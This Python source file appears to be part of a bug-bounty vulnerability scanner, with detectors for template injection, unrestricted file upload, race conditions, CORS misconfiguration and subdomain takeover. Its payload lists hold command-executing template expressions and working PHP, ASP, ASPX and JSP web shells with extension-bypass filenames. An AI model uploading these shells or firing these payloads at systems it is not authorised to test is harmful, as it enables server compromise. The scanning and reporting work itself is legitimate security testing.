import asyncio
from typing import List, Optional, Dict, Any
from app.detectors.base import Detector, Endpoint, Finding, Validator
from app.config import settings


class SSTIDetector(Detector):
    name = "ssti"
    vuln_class = "Server-Side Template Injection (SSTI)"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Injection > Server-Side Template Injection (SSTI)"

    PAYLOADS = {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[0]}}",
        ],
        "twig": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "freemarker": [
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        ],
        "velocity": [
            "#set($x=7*7) $x",
            "#set($rt=$class.forName('java.lang.Runtime'))",
        ],
        "smarty": [
            "{7*7}",
            "{php}echo `id`;{/php}",
        ],
        "erb": [
            "<%= 7*7 %>",
            "<%= `id` %>",
        ],
        "thymeleaf": [
            "${7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        "express": [
            "<%= 7*7 %>",
            "<%- 7*7 %>",
        ],
    }

    GENERIC_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{7*7}",
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        for param in endpoint.params:
            for engine, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    finding = await self._test_payload(endpoint, param, payload, engine)
                    if finding:
                        findings.append(finding)
                        break
                if findings:
                    break

            if not findings:
                for payload in self.GENERIC_PAYLOADS:
                    finding = await self._test_payload(endpoint, param, payload, "generic")
                    if finding:
                        findings.append(finding)
                        break

        return findings

    async def _test_payload(self, endpoint: Endpoint, param: str, payload: str, engine: str) -> Optional[Finding]:
        test_url = endpoint.with_param(param, payload)

        control = await self._fetch(endpoint.url)
        test = await self._fetch(test_url)

        if not control or not test:
            return None

        expected = "49"
        validation = Validator.ssti_evaluated(test["body"], expected)
        if validation.confirmed:
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="confirmed",
                evidence={
                    "payload": payload,
                    "engine": engine,
                    "expected_result": expected,
                    "request_url": test_url,
                    "response_status": test["status"],
                    "response_body_snippet": test["body"][:500],
                    "control_body_snippet": control["body"][:500],
                },
                summary=f"SSTI in parameter '{param}' ({engine} template engine)",
                description=(
                    f"The parameter '{param}' is vulnerable to Server-Side Template Injection. "
                    f"The template engine ({engine}) evaluates the injected expression '{payload}' "
                    f"and returns the computed result '{expected}'."
                ),
                steps_to_reproduce=(
                    f"1. Send payload: {payload}\n"
                    f"2. Observe evaluated result '49' in response"
                ),
                impact="SSTI often leads to Remote Code Execution (RCE) on the server.",
                remediation="Use sandboxed template engines. Avoid user input in templates. Use logic-less templates (Mustache). Implement strict input validation.",
            )
        return None

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT)
            return {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text}
        except Exception:
            return None


class FileUploadDetector(Detector):
    name = "file_upload"
    vuln_class = "Unrestricted File Upload"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "File Upload > Unrestricted File Upload"

    EXTENSION_PAYLOADS = [
        ("shell.php", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.php5", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.phtml", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.php.png", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.php;.jpg", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "php"),
        ("shell.asp", "<% eval request(\"cmd\") %>", "asp"),
        ("shell.aspx", "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>", "aspx"),
        ("shell.jsp", "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "jsp"),
        ("shell.svg", '<svg onload="alert(1)"/>', "svg"),
        ("shell.html", "<script>alert(1)</script>", "html"),
    ]

    CONTENT_TYPE_PAYLOADS = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/pdf",
        "text/plain",
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("POST", "PUT") and any(
            "file" in p.lower() or "upload" in p.lower() or "image" in p.lower()
            for p in endpoint.params
        )

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        upload_param = self._find_upload_param(endpoint)
        if not upload_param:
            return findings

        for filename, content, ext in self.EXTENSION_PAYLOADS:
            for content_type in self.CONTENT_TYPE_PAYLOADS:
                finding = await self._test_upload(endpoint, upload_param, filename, content, content_type, ext)
                if finding:
                    findings.append(finding)
                    break

            if findings:
                break

        return findings

    def _find_upload_param(self, endpoint: Endpoint) -> Optional[str]:
        for param in endpoint.params:
            if any(kw in param.lower() for kw in ["file", "upload", "image", "avatar", "document"]):
                return param
        return endpoint.params[0] if endpoint.params else None

    async def _test_upload(self, endpoint: Endpoint, param: str, filename: str, content: str, content_type: str, ext: str) -> Optional[Finding]:
        import uuid
        boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{param}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}--\r\n"
        )

        try:
            resp = await self.http_client.post(
                endpoint.url,
                content=body.encode(),
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                },
                timeout=settings.REQUEST_TIMEOUT,
            )

            if resp.status_code in (200, 201):
                upload_path = self._extract_upload_path(resp.text, filename)
                if upload_path:
                    verify = await self._verify_upload(upload_path)
                    if verify and "executed" in verify:
                        return self._make_finding(
                            endpoint=endpoint,
                            param=param,
                            confidence="confirmed",
                            evidence={
                                "filename": filename,
                                "content_type": content_type,
                                "extension": ext,
                                "upload_path": upload_path,
                                "verification": verify,
                                "response_status": resp.status_code,
                                "request_url": endpoint.url,
                                "response_body": resp.text[:500],
                            },
                            summary=f"Unrestricted File Upload: {ext} file uploaded and executed as {filename}",
                            description=(
                                f"The file upload endpoint accepts {ext} files with executable content. "
                                f"The uploaded file is accessible at {upload_path} and executes code."
                            ),
                            steps_to_reproduce=(
                                f"1. Upload {filename} with executable content\n"
                                f"2. Access uploaded file at {upload_path}\n"
                                f"3. Observe code execution"
                            ),
                            impact="Remote Code Execution via web shell upload.",
                            remediation="Validate file type by content, not extension. Use allowlist of safe extensions. Store uploads outside webroot. Serve via download script. Scan with AV.",
                        )
        except Exception:
            pass
        return None

    def _extract_upload_path(self, response: str, filename: str) -> Optional[str]:
        import re
        patterns = [
            rf'(["\'])([^"\']*{re.escape(filename)}[^"\']*)\1',
            rf'(/uploads?/[^"\']*{re.escape(filename)})',
            rf'(/files?/[^"\']*{re.escape(filename)})',
            rf'(/media/[^"\']*{re.escape(filename)})',
        ]
        for pattern in patterns:
            match = re.search(pattern, response)
            if match:
                return match.group(1) if match.groups() else match.group(0)
        return None

    async def _verify_upload(self, path: str) -> Optional[Dict[str, Any]]:
        try:
            if not path.startswith("http"):
                return None
            resp = await self.http_client.get(path, timeout=10)
            if resp.status_code == 200:
                if "uid=" in resp.text or "gid=" in resp.text or "root:" in resp.text:
                    return {"executed": True, "output": resp.text[:200]}
        except Exception:
            pass
        return None


class RaceConditionDetector(Detector):
    name = "race_condition"
    vuln_class = "Race Condition (TOCTOU)"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Business Logic > Race Condition"

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("POST", "PUT", "PATCH") and any(
            kw in endpoint.url.lower() for kw in [
                "coupon", "promo", "discount", "gift", "voucher",
                "payment", "checkout", "order", "purchase",
                "transfer", "withdraw", "deposit", "balance",
                "inventory", "stock", "quantity", "limit",
                "register", "signup", "invite", "referral",
            ]
        )

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        data = {p: endpoint.get_param_value(p) or "test" for p in endpoint.params}
        results = await self._concurrent_requests(endpoint.url, data, count=20)

        success_count = sum(1 for r in results if r and r.get("status") == 200)
        if success_count > 1:
            unique_bodies = len(set(r.get("body", "") for r in results if r))
            if unique_bodies > 1 or success_count > 5:
                findings.append(self._make_finding(
                    endpoint=endpoint,
                    param="multiple",
                    confidence="confirmed",
                    evidence={
                        "concurrent_requests": 20,
                        "successful_responses": success_count,
                        "unique_responses": unique_bodies,
                        "sample_responses": [r.get("body", "")[:200] for r in results[:3] if r],
                        "request_url": endpoint.url,
                        "response_body_snippet": "\n---\n".join(r.get("body", "")[:500] for r in results[:3] if r),
                    },
                    summary=f"Race Condition in {endpoint.method} {endpoint.url}",
                    description=(
                        f"Sending 20 concurrent requests to {endpoint.url} resulted in {success_count} "
                        f"successful responses with {unique_bodies} unique response bodies. This indicates "
                        f"a TOCTOU race condition where state validation and modification are not atomic."
                    ),
                    steps_to_reproduce=(
                        f"1. Send 20 concurrent {endpoint.method} requests to {endpoint.url}\n"
                        f"2. Observe {success_count} successes (expected 1)"
                    ),
                    impact="Race conditions can lead to coupon reuse, double-spending, inventory bypass, or limit evasion.",
                    remediation="Use database transactions with proper isolation levels. Implement application-level locks. Use atomic operations (e.g., UPDATE ... SET qty = qty - 1 WHERE qty > 0).",
                ))

        return findings

    async def _concurrent_requests(self, url: str, data: Dict, count: int = 20) -> List[Dict[str, Any]]:
        async def single_request():
            try:
                resp = await self.http_client.post(url, json=data, timeout=settings.REQUEST_TIMEOUT)
                return {"status": resp.status_code, "body": resp.text}
            except Exception:
                return None

        tasks = [single_request() for _ in range(count)]
        return await asyncio.gather(*tasks)


class CORSScanner(Detector):
    name = "cors"
    vuln_class = "CORS Misconfiguration"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
    bugcrowd_vrt_category = "Configuration > CORS Misconfiguration"

    def applies_to(self, endpoint: Endpoint) -> bool:
        return True

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        test_origins = [
            "https://evil.com",
            "https://sub.evil.com",
            "null",
            "https://evil.com.attacker.com",
            "http://localhost:3000",
        ]

        for origin in test_origins:
            finding = await self._test_cors(endpoint, origin)
            if finding:
                findings.append(finding)

        return findings

    async def _test_cors(self, endpoint: Endpoint, origin: str) -> Optional[Finding]:
        try:
            resp = await self.http_client.options(
                endpoint.url,
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "Content-Type",
                },
                timeout=settings.REQUEST_TIMEOUT,
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            if acao == origin and acac.lower() == "true":
                cors_headers = {
                    h: v for h, v in resp.headers.items()
                    if h.lower().startswith("access-control")
                }
                return self._make_finding(
                    endpoint=endpoint,
                    param=None,
                    confidence="confirmed",
                    evidence={
                        "test_origin": origin,
                        "acao": acao,
                        "acac": acac,
                        "response_headers": dict(resp.headers),
                         "request_url": (
                            f"OPTIONS {endpoint.url}\n"
                            f"Origin: {origin}\n"
                            f"Access-Control-Request-Method: POST\n"
                            f"Access-Control-Request-Headers: Content-Type"
                        ),
                        "response_body_snippet": (
                            f"HTTP/{resp.http_version} {resp.status_code}\n"
                            + "\n".join(f"{k}: {v}" for k, v in cors_headers.items())
                        ),
                    },
                    summary=f"CORS Misconfiguration: Reflects arbitrary Origin with credentials",
                    description=(
                        f"The endpoint reflects the arbitrary Origin '{origin}' in "
                        f"Access-Control-Allow-Origin and allows credentials. This allows "
                        f"cross-origin attacks with user credentials."
                    ),
                    steps_to_reproduce=(
                        f"1. Send OPTIONS request with Origin: {origin}\n"
                        f"2. Observe ACAO: {acao} and ACAC: {acac}"
                    ),
                    impact="Attackers can read authenticated user data via cross-origin requests.",
                    remediation="Use specific allowed origins in ACAO. Never reflect arbitrary origins. Set ACAC=false unless needed. Use Vary: Origin.",
                )
        except Exception:
            pass
        return None


class SubdomainTakeoverDetector(Detector):
    name = "subdomain_takeover"
    vuln_class = "Subdomain Takeover"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Configuration > Subdomain Takeover"

    FINGERPRINTS = {
        "github": ["There isn't a GitHub Pages site here", "For root URLs, see https://github.com/"],
        "heroku": ["No such app", "herokudns.com"],
        "s3": ["NoSuchBucket", "The specified bucket does not exist"],
        "azure": ["404 Web Site not found", "azurewebsites.net"],
        "cloudfront": ["The request could not be satisfied", "cloudfront.net"],
        "fastly": ["Fastly error: unknown domain", "fastly.net"],
        "shopify": ["Sorry, this shop is currently unavailable", "myshopify.com"],
        "pantheon": ["The gods are wise, but they don't know this site", "pantheon.io"],
        "ghost": ["The thing you were looking for is no longer here", "ghost.io"],
        "bitbucket": ["Repository not found", "bitbucket.io"],
        "gitlab": ["The page could not be found", "gitlab.io"],
        "surge": ["project not found", "surge.sh"],
        "netlify": ["Not Found - Request ID", "netlify.app"],
        "firebase": ["Site not found", "firebaseapp.com"],
    }

    def applies_to(self, endpoint: Endpoint) -> bool:
        return False

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        return []

    async def check_subdomain(self, subdomain: str) -> Optional[Finding]:
        try:
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5

            cname_records = resolver.resolve(subdomain, "CNAME")
            for rdata in cname_records:
                cname = str(rdata.target).rstrip(".")
                for service, fingerprints in self.FINGERPRINTS.items():
                    if service in cname:
                        verify = await self._verify_takeover(subdomain, cname, fingerprints)
                        if verify:
                            return self._make_finding(
                                endpoint=Endpoint(url=f"http://{subdomain}", method="GET"),
                                param=None,
                                confidence="confirmed",
                                evidence={
                                    "subdomain": subdomain,
                                    "cname": cname,
                                    "service": service,
                                    "fingerprint": verify,
                                    "request_url": f"http://{subdomain}",
                                    "response_body_snippet": verify[:500],
                                },
                                summary=f"Subdomain Takeover: {subdomain} -> {cname} ({service})",
                                description=(
                                    f"The subdomain {subdomain} has a CNAME pointing to {cname} "
                                    f"({service}) which is unclaimed. An attacker can claim this "
                                    f"service and serve content under {subdomain}."
                                ),
                                steps_to_reproduce=(
                                    f"1. Resolve CNAME for {subdomain}: {cname}\n"
                                    f"2. Verify service is unclaimed\n"
                                    f"3. Claim the service and control {subdomain}"
                                ),
                                impact="Full control of subdomain for phishing, cookie theft, OAuth abuse.",
                                remediation="Remove dangling CNAME records. Claim the service before creating DNS. Monitor DNS regularly.",
                            )
        except Exception:
            pass
        return None

    async def _verify_takeover(self, subdomain: str, cname: str, fingerprints: List[str]) -> Optional[str]:
        try:
            resp = await self.http_client.get(f"http://{subdomain}", timeout=10, follow_redirects=True)
            body = resp.text
            for fp in fingerprints:
                if fp.lower() in body.lower():
                    return fp
        except Exception:
            pass
        return None